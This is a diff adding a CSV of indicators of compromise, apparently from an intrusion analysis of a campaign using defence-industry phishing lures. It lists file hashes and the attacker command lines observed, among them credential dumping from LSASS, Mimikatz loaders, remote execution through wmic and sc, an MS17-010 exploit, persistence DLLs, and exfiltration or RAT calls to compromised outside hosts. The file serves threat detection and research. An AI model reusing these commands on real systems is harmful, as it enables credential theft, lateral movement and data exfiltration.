@@ -1,0 +1,113 @@
+Id,File,Comment,MD5,SHA-1,SHA-256,Command line
+1,C:\ProgramData\IBM\IBM.dat,ADfind,707ec5c00170cee6e9879803c316eac6,0301d79dd37658a0434c0d04148defa3e0385b07,cfd201ede3ebc0deb0031983b2bda9fc54e24d244063ed323b0e421a535cff92,"C:\windows\system32\cmd.exe /c C:\ProgramData\IBM\IBM.DAT -b dc=<DC>,dc=<DC>,dc=<DC> -f ""objectcategory=organizationalUnit"" CanonicalName -nodn -csv > C:\ProgramData\IBM\ou.dat 2>&1
+c:\windows\system32\cmd.exe /c C:\ProgramData\IBM\IBM.DAT -b dc=<DC>,dc=<DC>,dc=<DC> -f ""objectcategory=person"" cn sAMAccountName description distinguishedName objectSid whenCreated whenChanged lastLogon pwdLastSet lastLogonTimestamp memberof -tdc -nodn -csv > C:\ProgramData\IBM\user.dat 2>&1
+c:\windows\system32\cmd.exe /c C:\ProgramData\IBM\IBM.DAT -b dc=<DC>,dc=<DC>,dc=<DC> -f ""objectcategory=computer"" cn sAMAccountName distinguishedName operatingSystem operatingSystemVersion objectSid ms-ds-creatorsid whenCreated whenChanged -tdc -nodn -csv > C:\ProgramData\IBM\com.dat 2>&1
+c:\windows\system32\cmd.exe /c C:\ProgramData\IBM\IBM.DAT -b dc=<DC>,dc=<DC>,dc=<DC> -f ""objectcategory=group"" name distinguishedName memberof -nodn -csv > C:\ProgramData\IBM\group.dat 2>&1"
+2,C:\ProgramData\Kagent.exe,ADfind,9b02dd2a1a15e94922be3f85129083ac,2cb6ff75b38a3f24f3b60a2742b6f4d6027f0f2a,b1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682,
+3,bnotices.php,b347k web shell on C2,,,,
+4,C:\ProgramData\FreePDF\ntuser.bat,Batch to execute commands,c7ec4d246cbc3567728c095976c73414,,,
+5,C:\ProgramData\gather.bat,Batch to execute commands,31cd25127b283d001e3a9a43a95bcb85,,,
+6,C:\ProgramData\IBM\ntuser.bat,Batch to execute commands,c7ec4d246cbc3567728c095976c73414,,,"cmd.exe /c ""wmic /NODE:<HOSTNAME> /USER:<DOMAIN>\<USER> /PASSWORD:<PASSWORD> PROCESS CALL CREATE ""cmd.exe /c c:\ProgramData\IBM\ntuser.bat"" > C:\Windows\TEMP\~DF90A3.tmp"" 2>&1"
+7,C:\ProgramData\Intel\DAL\ntuser.bat,Batch to execute commands,,,,"wmic /NODE:<HOSTNAME> /USER:<DOMAIN>\<USER> /PASSWORD:<PASSWORD> PROCESS CALL CREATE ""cmd.exe /c C:\ProgramData\Intel\DAL\ntuser.bat"""
+8,C:\ProgramData\USOShared\uso.bat,Batch to execute commands,,,,
+9,C:\RECYCLER\rclc.bat,Batch to execute commands,,,,"cmd.exe /c ""sc \\192.168.2.11 create RPCMGR binPath= ""cmd.exe /c c:\RECYCLER\rclc.bat"" > C:\Users\<USER>\AppData\Local\Temp\~DFD384.tmp"" 2>&1"
+10,C:\ProgramData\comms\gather.bat,Batch to start Persistence DLL,,,,
+11,C:\ProgramData\gat.bat,Batch to start Persistence DLL,ed49368b051117833a5fb6af03508634,,,
+12,C:\ProgramData\comms.bat,Batch to start Persistence DLL comms.io,a9732bb0ad1bb4ad732cbe5714def4d5,,,
+13,BoeingPDF.exe,Dropper,5618b70e7ddc1064282fc90b93fe6c34,,,E:\BoeingPDF.exe
+14,BoeingPDF.iso,Dropper iso container,,,,
+15,c:\RECYCLER\~DF011.DAT,Encrypted Mimikatz BLOB,631da819149e4fee25b06e1da377382c,643041e60643d735054a28199ed30f96be58d445,179c77f392f804a5266b36205d043ee7fc6b0273a6c31f8590960df505f6ad0c,
+16,C:\ProgramData\UniqueId\~DF234.TMP,Executable for exfiltration,254a7a0c1db2bea788ca826f4b5bf51a,,,C:\ProgramData\IBM\~DF234.TMP S0RMM-50QQE-F65DN-DCPYN-5QEQA https://www.gonnelli.it/uploads/catalogo/thumbs/thumb.asp C:\ProgramData\IBM\restore002.dat data05 10000 -p 192.168.1.240 8080
+17,C:\ProgramData\IBM\IBM122.DAT,Loader for encrypted Mimikatz variant,6f7b837ee3cb27712ec13751d4c8a7f5,,,C:\ProgramData\IBM\IBM122.DAT  C:\ProgramData\IBM\IBM121.DAT Z17FDaciCdAbXrRe Y0hKcGRtbHNaV2RsT2pwa1pXSjFaeXh6Wld0MWNteHpZVG82Ykc5bmIyNXdZWE56ZDI5eVpITT0=
+18,c:\RECYCLER\~DF012.TMP,Loader for encrypted Mimikatz variant,82968937f1846b7e8cd94dde420fd5f1,3a4dcfe286693ca435d3408fe813b53671bf1286,42e4a9aeff3744bbbc0e82fd5b93eb9b078460d8f40e0b61b27b699882f521be,~DF012.TMP -f c:\RECYCLER\~DF011.TXT c:\RECYCLER\~DF011.DAT 1q2w3e4r@#$@#$@#$
+19,C:\solr\~DF010.TMP,Loader for encrypted Mimikatz variant,,,,"cmd.exe /c ""wmic /NODE:192.168.1.84 /USER:<DOMAIN>\<USER> /PASSWORD:<PASSWORD PROCESS CALL CREATE ""c:\solr\~DF010.TMP -f c:\solr\~DF011.TXT c:\solr\~DF011.TMP 1q2w3e4r@#$@#$@#$"" > C:\Users\<USER>\AppData\Local\Temp\~DF8E8D.tmp"" 2>&1"
+20,C:\ProgramData\gom\gom_3d.dat,lsass.exe process memory,,,,
+21,BAE_FMV_SOF.docx,Malicious phishing document,bd0c929701308c84e67479adb719367c,533b08aa5225084066df648a30ca107daa66a941,08a75ad3195d4e389786d338519913bbd86fb8112c2cf5c729297387207ce6e7,
+22,Boeing_Defense_PM.docx,Malicious phishing document,,,,
+23,Boeing_GS.docx,Malicious phishing document,,,,
+24,Boeing_Spectrolab.docx,Malicious phishing document,,,,
+25,C:\ProgramData\IBM\SearchProtocol.exe,MS17-010 exploit,,f09d9c7783adb4a44d48c77e412319e1c9cd4384,,C:\ProgramData\IBM\SearchProtocol.exe C:\ProgramData\IBM\SearchProtocol.cache HC7k08UOgflouO8i 192.168.1.17 C:\ProgramData\IBM\SearchProtocols.dmp C:\ProgramData\IBM\SearchProtocols.mdmp
+26,%TEMP%\CMP3894.tmp,Output,,,,
+27,%TEMP%\CMPC42B.tmp,Output,453654d6f43ff6bc4ea51d7a706b1c53,,,C:\ProgramData\Intel\DAL\~TMP123.DAT H:\ 0 C:\Users\<USER>\AppData\Local\Temp\CMPC42B.tmp (Directory listing of drive)
+28,%TEMP%\TMP37F7.tmp,Output,,,,
+29,%TEMP%\TMPC40A.tmp,Output,,,,
+30,C:\Windows\system32\Drivers\pssdk-proto.sys,Packet Sniffer service DLL,37ee8c694dadbc2f38a1d27b4bca0f8d,ebfe815b75d5ece5d595042d73ba331658af0d98,8a3998c88c64ec6009247cb9901f1baec181558299521b2f367883cbebae0ba4,
+31,%LOCALAPPDATA%\VirtualStore\ProgramData\ssh\putty.io,Persistence DLL,,,,"c:\windows\system32\rundll32.exe  c:\programdata\ssh\putty.io, ProjectView DJiMKWMV2cicZyoW"
+32,C:\ProgramData\~DF565.TMP,Persistence DLL,657127b2bdb10dcce9a6fa693abdf5a8,,,
+33,C:\ProgramData\comms.io,Persistence DLL,,,,
+34,C:\ProgramData\Comms\comms.io,Persistence DLL,5dea069f7bcee467ca20145ceecc5378,,,
+35,C:\ProgramData\desktop.ini,Persistence DLL,4f3556b6d9c884c696a5a929d450cf2d,,,"c:\windows\system32\rundll32.exe C:\ProgramData\desktop.ini,json_object_get_unicode_string 3XXKiU6J0QfZPHdH9SA5nZa3GpIqvgK7"
+36,C:\ProgramData\Git\GitClone.db,Persistence DLL,,,,"c:\windows\system32\rundll32.exe  c:\programdata\Git\GitClone.db, ProjectView DJiMKWMV2cicZyoW"
+37,C:\ProgramData\Intel\cache.io,Persistence DLL,,,,
+38,C:\ProgramData\Microsoft\MSSqlite3DB.evt.pol.dat,Persistence DLL,,B10C3FB3D826049E04C246D86C552200926086CB,,"rundll32.exe C:\ProgramData\Microsoft\MSSqlite3DB.evt.pol.dat,sqlite3_create_functionex NujsFYJNTpws664RGNruaKSu12TdGVYt"
+39,C:\ProgramData\ThumbNail\thumbnail.db,Persistence DLL,,,,"c:\windows\system32\rundll32.exe ""C:\ProgramData\ThumbNail\thumbnail.db"", CtrlPanel S-6-81-3811-75432205-060098-6872 0 0 900 1"
+40,C:\ProgramData\Windows\ntuser.dat,Persistence DLL,,,,"C:\windows\system32\rundll32.exe C:\ProgramData\Windows\ntuser.dat,CMS_ContentInfo {216B0291-15BF-D688-1700-4CFEE40B5330}"
+41,C:\Users\Public\FontCache.dat,Persistence DLL,3358c93ca892f145d303a005262d7a3d,,,"C:\Windows\System32\rundll32.exe C:\Users\Public\FontCache.dat,ilBindComponent WLFNjCysJmJZD22En4fKd3fTfRqXASqK"
+42,%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\GitClone.lnk,Persistence LNK,,,,
+43,%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\NavCache.lnk,Persistence LNK for C:\ProgramData\Intel\cache.io,,,,
+44,%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MSPolicy.lnk,Persistence LNK for C:\ProgramData\Microsoft\MSSqlite3DB.evt.pol.dat,,,,
+45,%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\OneNote.lnk,Persistence LNK for C:\Users\Public\FontCache.dat,,,,
+46,C:\ProgramData\ntusers.pool,Persitence DLL,1256b1f01c08ad10bb36c6b4ca0b2a00,,,"C:\Windows\System32\rundll32.exe C:\ProgramData\ntusers.pool,ilBindComponent nVhIq5ifeTQiuOhmQC51dK1DEnyUWk7h"
+47,C:\ProgramData\IBM\igfxmnr.exe,RAR,4c2a76ceee9becfeffe78265166182ba,c70b71f7aa367d88c6ec5942269a45cbc66510b3,ea139458b4e88736a3d48e81569178fd5c11156990b6a90e2d35f41b1ad9bac1,"C:\ProgramData\IBM\igfxmnr.exe a -hp1q2w3e4 -m5 ""C:\ProgramData\IBM\restore01.dat"" ""C:\ProgramData\IBM\IBM010J.DAT""
+C:\ProgramData\IBM\igfxmnr.exe a -hp1q2w3e4 -m5 ""C:\ProgramData\IBM\restore06.dat"" ""\\<DOMAINCONTROLLER>\SYSVOL\<FQDN>\scripts\"""
+48,C:\ProgramData\Intel\DAL\igfxmnr.exe,RAR,4c2a76ceee9becfeffe78265166182ba,c70b71f7aa367d88c6ec5942269a45cbc66510b3,ea139458b4e88736a3d48e81569178fd5c11156990b6a90e2d35f41b1ad9bac1,
+49,C:\ProgramData\Wagent.exe,RAR,070d15cd95c14784606ecaa88657551e,2ca084a8cb5b3b7869d019a01e13882782521a07,cf0121cd61990fd3f436bda2b2aff035a2621797d12fd02190ee0f9b2b52a75d,
+50,C:\ProgramData\IBM\~df099.dat,RAT component,,,,
+51,C:\ProgramData\Intel\DAL\~TMP015.DAT,RAT component,1b1afed4d2107648fa959bb738e25350,,,"cmd.exe /c ""sc \\<HOSTNAME> create rpcmgr binPath= ""cmd.exe /c c:\ProgramData\Intel\DAL\~TMP015.DAT -p 0x57AC098B"" > C:\Users\<USER>\AppData\Local\Temp\~DFE3B6.tmp"" 2>&1"
+52,C:\ProgramData\Intel\DAL\~TMP123.DAT,RAT component,,,,"C:\ProgramData\Intel\DAL\~TMP123.DAT -p 0x57AC098B 
+POST http://www.hirokawaunso.co.jp/wordpress/wp-includes/review.php?no=23485&unm=9986812&rtss=100&query=basic"
+53,C:\ProgramData\Microsoft\DeviceSync\DeviceCaches.DMP,RAT component,,,,cmd.exe /c C:\ProgramData\Microsoft\DeviceSync\DeviceCaches.DMP -p 0x53A4C60B  
+54,C:\ProgramData\ntuser.io,RAT component,ab252b14053c7c13ecc668773fa26ee5,,08875e26ca1a5e089590f6e9b681f328cc484a1a899dd07caa6fc4e738e6cfbc,cmd.exe /c C:\ProgramData\RAgent.exe OneDrive-USOPriv
+55,C:\ProgramData\ssh\ssh_tmp088.tmp,RAT component,aa85312c372738e889847608798b3b1a,,,"cmd.exe /c ""sc \\<HOSTNAME> create RPCMGR binPath= ""cmd.exe /c c:\ProgramData\ssh\ssh_tmp088.tmp -p 0x57AC098B"" > C:\Users\<USER>\AppData\Local\Temp\~DF693C.tmp"" 2>&1"
+56,C:\ProgramData\USOShared\USO.TMP,RAT component,657127b2bdb10dcce9a6fa693abdf5a8,,,"C:\ProgramData\USOShared\USO.TMP -p 0x57AC098B
+cmd.exe /c ""reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"" /v USOShare /t REG_SZ /d ""C:\ProgramData\USOShared\USO.TMP -p 0x57AC098B"" > C:\Windows\TEMP\~DF16D1.tmp"" 2>&1"
+57,C:\RECYCLER\~TMP.0312.bin,RAT component,,,,"cmd.exe /c ""sc \\192.168.1.17 create RPCMGR binPath= ""cmd.exe /c c:\RECYCLER\~TMP.0312.bin -p 0x57AC098B"" > C:\Users\<USER>\AppData\Local\Temp\~DFBF01.tmp"" 2>&1 
+cmd.exe /c ""wmic /NODE:192.168.1.17 /USER:workgroup\tempAdmins /PASSWORD:1q2w3e4r5t!@#$ PROCESS CALL CREATE ""c:\RECYCLER\~TMP.0312.bin -p 0x57AC098B"" > C:\Users\<USER>\AppData\Local\Temp\~DF8CA9.tmp"" 2>&1"
+58,C:\users\public\~df098.tmp,RAT component,,,,"cmd.exe /c ""sc \\<HOSTNAME> create RPCMGR binPath= ""cmd.exe /c c:\ProgramData\Veeam\~DF098.TMP -p 0x57AC098B"" > C:\Users\<USER>\AppData\Local\Temp\~DFEF26.tmp"" 2>&1 
+cmd.exe /c ""sc \\<HOSTNAME> create RPCMGR binPath= ""cmd.exe /c taskkill /im ~DF098.TMP /f"" > C:\Users\<USER>\AppData\Local\Temp\~DFC309.tmp"" 2>&1"
+59,chromeviewer.exe,RAT component,78df38b31b2c944e42a9a934ee206940,,,
+60,C:\Windows\sam.txt,SAM dump,,,,
+61,C:\ProgramData\IBM\IBM011.BIN,SMB scanner,,,,IBM011.BIN 192.168.1.1 192.168.1.255 10 C:\ProgramData\IBM\IBM011RMU.DAT workgroup\Administrator password 1
+62,C:\ProgramData\Cisco\CAGT.EXE,SMBMAP,6b69acebbdd63c3010c752e8321c13e0,,,C:\ProgramData\Cisco\cagt.exe  -u <USER> -d <DOMAIN> -p aad3b435b51404eeaad3b435b51404ee:<NTHASH> -H 192.168.1.134 -r C$\ProgramData 
+63,C:\ProgramData\gom\gom_3d.exe,SysInternals procdump,be046bab4a23f8db568535aaea565f87,,,C:\ProgramData\gom\gom_3d.exe -accepteula -ma lsass -o c:\ProgramData\gom\gom_3d.dat
+64,%LOCALAPPDATA%\ntuser.log1,Unknown,,,,
+65,%TEMP%\~DFFAC3.tmp,Unknown,,,,
+66,C:\ProgramData\FreePDF\~df088.dat,Unknown,,,,
+67,C:\ProgramData\FreePDF\~df099.dat,Unknown,,,,
+68,C:\ProgramData\FreePDF\~df456.dat,Unknown,,,,
+69,C:\ProgramData\FreePDF\~df456.tmp,Unknown,,,,
+70,C:\ProgramData\FreePDF\~df565.tmp,Unknown,,,,
+71,C:\ProgramData\FreePDF\DF033.TMP,Unknown,,,,
+72,c:\ProgramData\FreePDF\DF080.TMP,Unknown,,,,
+73,C:\ProgramData\FreePDF\DF234.TMP,Unknown,,,,
+74,C:\ProgramData\FreePDF\DF343.TMP,Unknown,,,,
+75,C:\ProgramData\FreePDF\DF435.TMP,Unknown,,,,
+76,c:\ProgramData\FreePDF\DF565.TMP,Unknown,,,,
+77,C:\ProgramData\Intel\NavCache.io,Unknown,,,,
+78,C:\ProgramData\itp11\cache3_5001238963-ENC.cache,Unknown,,,,
+79,C:\ProgramData\itp11\cache3_5001238964-ENC.cache,Unknown,,,,
+80,C:\ProgramData\Microsoft\DeviceSync\Deviceinc.db,Unknown,,,,
+81,C:\ProgramData\Microsoft\DeviceSync\Devicemdb.db,Unknown,,,,
+82,C:\ProgramData\Microsoft\DeviceSync\Devicestg.db,Unknown,,,,
+83,C:\ProgramData\Microsoft\DeviceSync\Devicestg.db,Unknown,,,,
+84,C:\ProgramData\Microsoft\DeviceSync\DF235.TMP,Unknown,,,,
+85,C:\ProgramData\Microsoft\DeviceSync\DF333.TMP,Unknown,,,,
+86,C:\ProgramData\Microsoft\DeviceSync\gather.bat,Unknown,,,,
+87,C:\ProgramData\USOShared\pkg.db,Unknown,,,,
+88,C:\Windows\System32\irmon.dll,Unknown,,,,
+89,C:\Windows\System32\srservice.dll,Unknown,,,,
+90,C:\Windows\System32\srsvc.dll,Unknown,,,,
+91,C:\ProgramData\Cisco\Client.exe,Unknown executable,f453dd430e160b4c07a9bc9f7c7e7bca,,,
+92,C:\ProgramData\cookie.dat,Unknown executable,92d9e6ccef0e41f5bf47b1a9f213ddbf,,,
+93,C:\ProgramData\Intel\cache.exe,Unknown executable,7ba191c703f24ccb04bfba4a931686f6,,,
+94,C:\ProgramData\Intel\DAL\~TMP323.DAT,Unknown executable,2852022f7a2e360e863cff1793eaa098,,,
+95,C:\ProgramData\Intel\iCLS.exe,Unknown executable,3415c8deefb3e7fb3394d411ebf33292,,,
+96,C:\ProgramData\Intel\SearchProtocol.bin,Unknown executable,,,,C:\ProgramData\Intel\SearchProtocol.bin 10128 C:\ProgramData\Intel\gather.bat 
+97,C:\ProgramData\UAgent.exe,Unknown executable,648e7cee1afd1d0998cda0b2b8d826ae,,,
+98,C:\ProgramData\UIU\ui.exe,Unknown executable,,,,
+99,C:\ProgramData\USOShared\~DF099.DAT,Unknown executable,,,,C:\ProgramData\USOShared\~DF099.DAT \\<HOSTNAME>\<SHARE>\<FOLDER> 0 C:\ProgramData\USOShared\<HOSTNAME>.bin 
+100,C:\Users\Public\DF090.TMP,Unknown executable,,,,"sc \\<HOSTNAME> create RPCMGR binPath= ""cmd.exe /c c:\ProgramData\Veeam\~DF090.TMP 3 c:\ProgramData\Veeam\ntuser.bat"""
+101,C:\Windows\System32\pchsvc.dll,Unknown service DLL,,,,"cmd.exe /c dir /a pchsvc.dll
+cmd.exe /c ""del \\<HOSTNAME>\c$\windows\system32\pchsvc.dll > C:\Users\<USER>\AppData\Local\Temp\~DFD584.tmp"" 2>&1"
+102,GD1029581823.docx,Malicious phishing document,9524af8a52cb7edc52838dcc95d00b81,9e3672862bf00791bc01d0bbf7209edee3d7d3b6,f12f87d56e9291ddea6f5db23b9f6066dbeb52ff06e14640e5a36418b5a9ea02,
+103,InternalPDFViewer.exe,RipplePDF viewer with unknown Hash,97724b3c86ebd723112eee4ec2c56e04,a44736d896c670fd0bf72c7535da7bdb0d00e9ba,36bd69a0bd334ea28b7c53091425421bf78f79e6007133a46c7c597bc660d9c8,
